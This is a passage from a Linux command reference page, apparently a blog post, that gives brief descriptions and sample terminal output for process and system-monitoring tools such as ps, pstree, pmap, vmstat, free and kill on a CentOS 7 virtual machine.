</span><span class='line'> dm-1              0.02         0.13         0.00       1068          0</span></code></pre></td></tr></table></div></figure>


<h4>pidstat</h4>

<blockquote><p>Report statistics for Linux tasks</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> pidstat -p 3381
</span><span class='line'> Linux 3.10.0-514.26.2.el7.x86_64 (tron)  10/05/2017  _x86_64_    (1 CPU)
</span><span class='line'> 
</span><span class='line'> 06:20:21 PM   UID       PID    %usr %system  %guest    %CPU   CPU  Command</span></code></pre></td></tr></table></div></figure>


<h4>mpstat</h4>

<blockquote><p>Report processors related statistics</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> mpstat
</span><span class='line'> Linux 3.10.0-514.26.2.el7.x86_64 (tron)  10/05/2017  _x86_64_    (1 CPU)
</span><span class='line'> 
</span><span class='line'> 06:23:38 PM  CPU    %usr   %nice    %sys %iowait    %irq   %soft  %steal  %guest  %gnice   %idle
</span><span class='line'> 06:23:38 PM  all    1.59    0.01    0.76    0.20    0.00    0.02    0.00    0.00    0.00   97.42</span></code></pre></td></tr></table></div></figure>


<h4>vmstat</h4>

<blockquote><p>Report virtual memory statistics</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> vmstat
</span><span class='line'> procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----
</span><span class='line'>  r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st
</span><span class='line'>  4  0      0 776148   1004 503192    0    0    70     8   79  169  2  1 97  0  0</span></code></pre></td></tr></table></div></figure>


<h4>tload</h4>

<blockquote><p>graphic representation of system load average</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> 0.01, 0.07, 0.17</span></code></pre></td></tr></table></div></figure>


<h4>watch</h4>

<blockquote><p>execute a program periodically, showing output fullscreen</p></blockquote>

<h4>lscpu</h4>

<blockquote><p>display information about the CPU architecture</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> lscpu
</span><span class='line'> Architecture:          x86_64
</span><span class='line'> CPU op-mode(s):        32-bit, 64-bit
</span><span class='line'> Byte Order:            Little Endian
</span><span class='line'> CPU(s):                1
</span><span class='line'> On-line CPU(s) list:   0
</span><span class='line'> Thread(s) per core:    1
</span><span class='line'> Core(s) per socket:    1
</span><span class='line'> Socket(s):             1
</span><span class='line'> NUMA node(s):          1
</span><span class='line'> Vendor ID:             GenuineIntel
</span><span class='line'> CPU family:            6
</span><span class='line'> Model:                 69
</span><span class='line'> Model name:            Intel(R) Core(TM) i5-4300U CPU @ 1.90GHz
</span><span class='line'> Stepping:              1
</span><span class='line'> CPU MHz:               2493.585
</span><span class='line'> BogoMIPS:              4988.45
</span><span class='line'> Hypervisor vendor:     VMware
</span><span class='line'> Virtualization type:   full
</span><span class='line'> L1d cache:             32K
</span><span class='line'> L1i cache:             32K
</span><span class='line'> L2 cache:              256K
</span><span class='line'> L3 cache:              3072K
</span><span class='line'> NUMA node0 CPU(s):     0</span></code></pre></td></tr></table></div></figure>


<h4>uptime</h4>

<blockquote><p>Tell how long the system has been running</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> uptime
</span><span class='line'>  16:11:48 up 14 min,  3 users,  load average: 0.06, 0.20, 0.28</span></code></pre></td></tr></table></div></figure>


<ul>
<li>show since when is the system up</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> uptime -s
</span><span class='line'> 2017-10-05 15:57:10</span></code></pre></td></tr></table></div></figure>


<h4>pmap</h4>

<blockquote><p>report memory map of a process</p></blockquote>

<ul>
<li>-p # Show full path to files in the mapping column</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> pmap -p $$
</span><span class='line'> 3425:   bash
</span><span class='line'> 0000000000400000    884K r-x-- /usr/bin/bash
</span><span class='line'> 00000000006dc000      4K r---- /usr/bin/bash
</span><span class='line'> 00000000006dd000     36K rw--- /usr/bin/bash
</span><span class='line'> 00000000006e6000     24K rw---   [ anon ]
</span><span class='line'> 0000000000cbc000   1572K rw---   [ anon ]
</span><span class='line'> 00007f1b843d1000     48K r-x-- /usr/lib64/libnss_files-2.17.so
</span><span class='line'> 00007f1b843dd000   2044K ----- /usr/lib64/libnss_files-2.17.so
</span><span class='line'> 00007f1b845dc000      4K r---- /usr/lib64/libnss_files-2.17.so
</span><span class='line'> 00007f1b845dd000      4K rw--- /usr/lib64/libnss_files-2.17.so
</span><span class='line'> 00007f1b845de000     24K rw---   [ anon ]
</span><span class='line'> 00007f1b845e4000 103588K r---- /usr/lib/locale/locale-archive
</span><span class='line'> 00007f1b8ab0d000   1756K r-x-- /usr/lib64/libc-2.17.so
</span><span class='line'> 00007f1b8acc4000   2044K ----- /usr/lib64/libc-2.17.so
</span><span class='line'> 00007f1b8aec3000     16K r---- /usr/lib64/libc-2.17.so
</span><span class='line'> 00007f1b8aec7000      8K rw--- /usr/lib64/libc-2.17.so
</span><span class='line'> 00007f1b8aec9000     20K rw---   [ anon ]
</span><span class='line'> 00007f1b8aece000      8K r-x-- /usr/lib64/libdl-2.17.so
</span><span class='line'> 00007f1b8aed0000   2048K ----- /usr/lib64/libdl-2.17.so
</span><span class='line'> 00007f1b8b0d0000      4K r---- /usr/lib64/libdl-2.17.so
</span><span class='line'> 00007f1b8b0d1000      4K rw--- /usr/lib64/libdl-2.17.so
</span><span class='line'> 00007f1b8b0d2000    148K r-x-- /usr/lib64/libtinfo.so.5.9
</span><span class='line'> 00007f1b8b0f7000   2048K ----- /usr/lib64/libtinfo.so.5.9
</span><span class='line'> 00007f1b8b2f7000     16K r---- /usr/lib64/libtinfo.so.5.9
</span><span class='line'> 00007f1b8b2fb000      4K rw--- /usr/lib64/libtinfo.so.5.9
</span><span class='line'> 00007f1b8b2fc000    128K r-x-- /usr/lib64/ld-2.17.so
</span><span class='line'> 00007f1b8b504000     12K rw---   [ anon ]
</span><span class='line'> 00007f1b8b512000      8K rw---   [ anon ]
</span><span class='line'> 00007f1b8b514000     28K r--s- /usr/lib64/gconv/gconv-modules.cache
</span><span class='line'> 00007f1b8b51b000      4K rw---   [ anon ]
</span><span class='line'> 00007f1b8b51c000      4K r---- /usr/lib64/ld-2.17.so
</span><span class='line'> 00007f1b8b51d000      4K rw--- /usr/lib64/ld-2.17.so
</span><span class='line'> 00007f1b8b51e000      4K rw---   [ anon ]
</span><span class='line'> 00007ffeb5ec8000    132K rw---   [ stack ]
</span><span class='line'> 00007ffeb5efc000      8K r-x--   [ anon ]
</span><span class='line'> ffffffffff600000      4K r-x--   [ anon ]
</span><span class='line'>  total           116692K</span></code></pre></td></tr></table></div></figure>


<h4>pwdx</h4>

<blockquote><p>report current working directory of a process</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> pwdx $$
</span><span class='line'> 3425: /root</span></code></pre></td></tr></table></div></figure>


<h4>free</h4>

<blockquote><p>Display amount of free and used memory in the system</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> free -h
</span><span class='line'>               total        used        free      shared  buff/cache   available
</span><span class='line'> Mem:           1.8G        509M        883M         10M        446M        1.1G
</span><span class='line'> Swap:          2.0G          0B        2.0G</span></code></pre></td></tr></table></div></figure>


<h4>nice</h4>

<blockquote><p>run a program with modified scheduling priority</p></blockquote>

<p> Niceness  values range  from  -20 (most favorable to the process) to 19 (least favorable to the process).</p>

<ul>
<li>-n # add integer N to the niceness (default 10)</li>
</ul>


<h4>renice</h4>

<blockquote><p> alter priority of running processes</p></blockquote>

<ul>
<li>-n # priority</li>
</ul>


<h4>sleep</h4>

<blockquote><p>delay for a specified amount of time</p></blockquote>

<h4>bg</h4>

<blockquote><p>Resume each suspended job jobspec  in  the  background,  as  if  it  had been started
with &amp;</p></blockquote>

<h4>fg</h4>

<blockquote><p>Resume jobspec in the foreground, and make it the current job</p></blockquote>

<h4>jobs</h4>

<blockquote><p>list active jobs</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> sleep 15 &
</span><span class='line'> [1] 9767
</span><span class='line'> [root@tron ~]# jobs
</span><span class='line'> [1]+  Running                 sleep 15 &</span></code></pre></td></tr></table></div></figure>


<h4>kill</h4>

<blockquote><p>terminate a process</p>

<p>Default is the TERM signal, which is similar to asking nicely to terminate. The more
forcefull option is KILL(9)</p></blockquote>

<ul>
<li>list signals</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> kill -l
</span><span class='line'>  1) SIGHUP    2) SIGINT   3) SIGQUIT  4) SIGILL   5) SIGTRAP
</span><span class='line'>  6) SIGABRT   7) SIGBUS   8) SIGFPE   9) SIGKILL 10) SIGUSR1
</span><span class='line'> 11) SIGSEGV  12) SIGUSR2 13) SIGPIPE 14) SIGALRM 15) SIGTERM
</span><span class='line'> 16) SIGSTKFLT    17) SIGCHLD 18) SIGCONT 19) SIGSTOP 20) SIGTSTP
</span><span class='line'> 21) SIGTTIN  22) SIGTTOU 23) SIGURG  24) SIGXCPU 25) SIGXFSZ
</span><span class='line'> 26) SIGVTALRM    27) SIGPROF 28) SIGWINCH    29) SIGIO   30) SIGPWR
</span><span class='line'> 31) SIGSYS   34) SIGRTMIN    35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+3
</span><span class='line'> 38) SIGRTMIN+4   39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+8
</span><span class='line'> 43) SIGRTMIN+9   44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+13
</span><span class='line'> 48) SIGRTMIN+14  49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-12
</span><span class='line'> 53) SIGRTMAX-11  54) SIGRTMAX-10 55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-7
</span><span class='line'> 58) SIGRTMAX-6   59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-2
</span><span class='line'> 63) SIGRTMAX-1   64) SIGRTMAX</span></code></pre></td></tr></table></div></figure>


<h4>pgrep,  pkill</h4>

<blockquote><p>look  up  or signal processes based on name and other attributes</p></blockquote>

<h4>ps</h4>

<blockquote><p>report a snapshot of the current processes</p></blockquote>

<ul>
<li>-e # Select all processes.  Identical to -A</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ps -e
</span><span class='line'>   PID TTY          TIME CMD
</span><span class='line'>     1 ?        00:00:02 systemd
</span><span class='line'>     2 ?        00:00:00 kthreadd
</span><span class='line'>     3 ?        00:00:00 ksoftirqd/0
</span><span class='line'>     5 ?        00:00:00 kworker/0:0H
</span><span class='line'>     7 ?        00:00:00 migration/0
</span><span class='line'>     8 ?        00:00:00 rcu_bh
</span><span class='line'>     9 ?        00:00:00 rcu_sched
</span><span class='line'>    10 ?        00:00:00 watchdog/0
</span><span class='line'>    12 ?        00:00:00 kdevtmpfs
</span><span class='line'>[...]
</span><span class='line'>  3591 pts/0    00:00:00 man
</span><span class='line'>  3598 pts/0    00:00:00 less
</span><span class='line'>  3608 ?        00:00:00 sleep
</span><span class='line'>  3614 pts/1    00:00:00 ps</span></code></pre></td></tr></table></div></figure>


<ul>
<li>-r #  Restrict the selection to only running processes</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ps -r
</span><span class='line'>   PID TTY      STAT   TIME COMMAND
</span><span class='line'>  1354 tty1     Rs+    0:08 /usr/bin/Xorg :0 -background none -noreset -audit 4 -
</span><span class='line'>  3805 pts/1    R+     0:00 ps -r</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>-u # Select by effective user ID (EUID) or name</p></li>
<li><p>process tree</p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ps --forest
</span><span class='line'>   PID TTY          TIME CMD
</span><span class='line'>  3508 pts/1    00:00:00 bash
</span><span class='line'>  3880 pts/1    00:00:00  \_ ps</span></code></pre></td></tr></table></div></figure>


<ul>
<li>all processes + EUID</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ps -aux
</span><span class='line'> USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
</span><span class='line'> root         1  0.1  0.3 128088  6756 ?        Ss   17:03   0:02 /usr/lib/system
</span><span class='line'> root         2  0.0  0.0      0     0 ?        S    17:03   0:00 [kthreadd]
</span><span class='line'> root         3  0.0  0.0      0     0 ?        S    17:03   0:00 [ksoftirqd/0]
</span><span class='line'> root         7  0.0  0.0      0     0 ?        S    17:03   0:00 [migration/0]
</span><span class='line'> root         8  0.0  0.0      0     0 ?        S    17:03   0:00 [rcu_bh]
</span><span class='line'> root         9  0.0  0.0      0     0 ?        R    17:03   0:00 [rcu_sched]
</span><span class='line'> root        10  0.0  0.0      0     0 ?        S    17:03   0:00 [watchdog/0]
</span><span class='line'> root        12  0.0  0.0      0     0 ?        S    17:03   0:00 [kdevtmpfs]
</span><span class='line'> root        13  0.0  0.0      0     0 ?        S&lt;   17:03   0:00 [netns]
</span><span class='line'> root        14  0.0  0.0      0     0 ?        S    17:03   0:00 [khungtaskd]
</span><span class='line'> root        15  0.0  0.0      0     0 ?        S&lt;   17:03   0:00 [writeback]
</span><span class='line'> root        16  0.0  0.0      0     0 ?        S&lt;   17:03   0:00 [kintegrityd]
</span><span class='line'> root        17  0.0  0.0      0     0 ?        S&lt;   17:03   0:00 [bioset]
</span><span class='line'> root        18  0.0  0.0      0     0 ?        S&lt;   17:03   0:00 [kblockd]
</span><span class='line'> root        19  0.0  0.0      0     0 ?        S&lt;   17:03   0:00 [md]
</span><span class='line'> root        25  0.0  0.0      0     0 ?        S    17:04   0:00 [kswapd0]
</span><span class='line'> root        26  0.0  0.0      0     0 ?        SN   17:04   0:00 [ksmd]
</span><span class='line'> root        27  0.0  0.0      0     0 ?        SN   17:04   0:00 [khugepaged]
</span><span class='line'> root        28  0.0  0.0      0     0 ?        S    17:04   0:00 [fsnotify_mark]
</span><span class='line'> root        29  0.0  0.0      0     0 ?        S&lt;   17:04   0:00 [crypto]
</span><span class='line'> [...]
</span><span class='line'> root       587  0.0  0.3  47700  5856 ?        Ss   17:04   0:00 /usr/lib/system
</span><span class='line'> root       625  0.0  0.0      0     0 ?        S&lt;   17:04   0:00 [nfit]
</span><span class='line'> root       666  0.0  0.0      0     0 ?        S&lt;   17:04   0:00 [xfs-buf/sda1]
</span><span class='line'> dbus       727  0.0  0.1  36328  3332 ?        Ssl  17:04   0:01 /bin/dbus-daemo
</span><span class='line'> root       734  0.0  0.0 201208  1208 ?        Ssl  17:04   0:00 /usr/sbin/gsspr
</span><span class='line'> root      2862  0.0  0.1 380356  3468 ?        Sl   17:06   0:00 /usr/libexec/gv
</span><span class='line'> root      3508  0.0  0.1 116688  3392 pts/1    Ss   17:07   0:00 bash
</span><span class='line'> root      3591  0.0  0.1 119548  2292 pts/0    S+   17:12   0:00 man ps
</span><span class='line'> root      3598  0.0  0.0 110248   960 pts/0    S+   17:12   0:00 less -s
</span><span class='line'> root      3718  0.0  0.0      0     0 ?        S&lt;   17:22   0:00 [kworker/0:2H]
</span><span class='line'> root      3743  0.0  0.0      0     0 ?        S    17:24   0:00 [kworker/0:0]
</span><span class='line'> root      3819  0.0  0.0      0     0 ?        S&lt;   17:27   0:00 [kworker/0:1H]
</span><span class='line'> root      3892  0.1  0.0      0     0 ?        S    17:29   0:00 [kworker/0:2]
</span><span class='line'> root      3955  0.0  0.0      0     0 ?        S&lt;   17:33   0:00 [kworker/0:0H]
</span><span class='line'> root      3967  0.0  0.0 107892   604 ?        S    17:34   0:00 sleep 60
</span><span class='line'> root      3968  0.1  0.0      0     0 ?        R    17:34   0:00 [kworker/0:1]
</span><span class='line'> root      3979  0.0  0.0 153136  1876 pts/1    R+   17:35   0:00 ps -aux</span></code></pre></td></tr></table></div></figure>


<ul>
<li>long format, don&rsquo;t show flags</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ps -ly
</span><span class='line'> S   UID   PID  PPID  C PRI  NI   RSS    SZ WCHAN  TTY          TIME CMD
</span><span class='line'> S     0  3508  3438  0  80   0  3392 29172 wait   pts/1    00:00:00 bash
</span><span class='line'> R     0  4002  3508  0  80   0  1452 37232 -      pts/1    00:00:00 ps</span></code></pre></td></tr></table></div></figure>


<ul>
<li>get running processes</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> echo $$
</span><span class='line'> 3744
</span><span class='line'> ps -p $$ -F
</span><span class='line'> UID        PID  PPID  C    SZ   RSS PSR STIME TTY          TIME CMD
</span><span class='line'> root      3697  3692  0 29172  3372   0 13:09 pts/0    00:00:00 bash</span></code></pre></td></tr></table></div></figure>


<h4>pstree</h4>

<blockquote><p>display a tree of processes</p></blockquote>

<ul>
<li>-a # Show  command  line arguments</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> pstree -a
</span><span class='line'> systemd --switched-root --system --deserialize 21
</span><span class='line'>   ├─ModemManager
</span><span class='line'>   │   └─2*[{ModemManager}]
</span><span class='line'>   ├─NetworkManager --no-daemon
</span><span class='line'>   │   ├─dhclient -d -q -sf /usr/libexec/nm-dhcp-helper -pf /var/run/dhclient-enp0s3.pid -lf ...
</span><span class='line'>   │   └─2*[{NetworkManager}]
</span><span class='line'>   ├─abrt-watch-log -F BUG: WARNING: at WARNING: CPU: INFO: possible recursive locking detected ernel BUG at list_del corruption list_add corruptiondo_IRQ: stack overfl
</span><span class='line'>   ├─abrt-watch-log -F Backtrace /var/log/Xorg.0.log -- /usr/bin/abrt-dump-xorg -xD
</span><span class='line'>   ├─abrtd -d -s
</span><span class='line'>   ├─accounts-daemon
</span><span class='line'>   │   └─2*[{accounts-daemon}]
</span><span class='line'>   ├─alsactl -s -n 19 -c -E ALSA_CONFIG_PATH=/etc/alsa/alsactl.conf --initfile=/lib/alsa/init/00main rdaemon
</span><span class='line'>   ├─at-spi-bus-laun
</span><span class='line'>   │   ├─dbus-daemon --config-file=/etc/at-spi2/accessibility.conf --nofork --print-address 3
</span><span class='line'>   │   │   └─{dbus-daemon}
</span><span class='line'>   │   └─3*[{at-spi-bus-laun}]
</span><span class='line'>   ├─at-spi2-registr --use-gnome-session
</span><span class='line'>   │   └─2*[{at-spi2-registr}]
</span><span class='line'>   ├─atd -f
</span><span class='line'>   ├─auditd -n
</span><span class='line'>   │   ├─audispd
</span><span class='line'>   │   │   ├─sedispatch
</span><span class='line'>   │   │   └─{audispd}
</span><span class='line'>   │   └─{auditd}
</span><span class='line'>   ├─avahi-daemon
</span><span class='line'>   │   └─avahi-daemon
</span><span class='line'>   ├─caribou
</span><span class='line'>   │   └─2*[{caribou}]
</span><span class='line'>   ├─colord
</span><span class='line'>   │   └─2*[{colord}]
</span><span class='line'>   ├─crond -n
</span><span class='line'>   ├─cupsd -f
